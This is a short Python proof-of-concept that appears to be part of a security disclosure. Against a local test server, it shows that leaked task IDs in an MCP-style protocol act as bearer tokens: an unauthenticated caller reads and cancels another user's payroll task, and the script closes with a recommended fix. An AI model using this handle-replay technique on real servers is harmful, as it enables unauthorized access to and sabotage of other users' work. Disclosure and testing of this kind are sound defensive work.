#!/usr/bin/env python3
"""
PoC 1 - The Task-Handle Heist   (headliner)

Task IDs are bearer tokens ("MAY be used as bearer tokens ... not formally
capability-bearing"). There is no session to anchor a trust decision to, so a
leaked handle IS the authority. An attacker who never authenticated can read
the victim's task result and hit the kill switch - from a totally separate
connection (or a different server instance).

Setup:
    python3 server.py --port 9001 --store /tmp/mcp_tasks.db --fresh
Run:
    python3 poc1_handle_heist.py
"""
from common import call, line

VICTIM = 9001
ATTACKER = 9001  # imagine a different instance behind the same LB - shared store

print("Alice starts a long task on the server she's authenticated to.")
r = call(VICTIM, "tools/call", {"name": "generate_report", "arguments": {"amount": 500, "note": "Q3 payroll run"}},
         token="tok-alice")
handle = r["task"]["taskId"]
print(f"  -> server minted handle: {handle}")
line()

print("The handle leaks. In real life: a log line, an error message, an OTel")
print("baggage header, a chatty tool. Here we just... have it.")
leaked = handle
line()

print("Attacker holds ONLY the handle. No token. Fresh connection. Watch:")
peek = call(ATTACKER, "tasks/get", {"taskId": leaked})   # note: no token at all
print(f"  attacker tasks/get  -> owner={peek['task']['owner']}  status={peek['task']['status']}")
kill = call(ATTACKER, "tasks/cancel", {"taskId": leaked})
print(f"  attacker tasks/cancel -> {kill}")
line()
print("The attacker read Alice's task and cancelled her payroll run without ever")
print("proving who they are. Statelessness removed the thing we were leaning on.")
print("\nFIX: bind handle->principal server-side; authorize EVERY task request;")
print("     never emit handles into logs/errors/telemetry.")
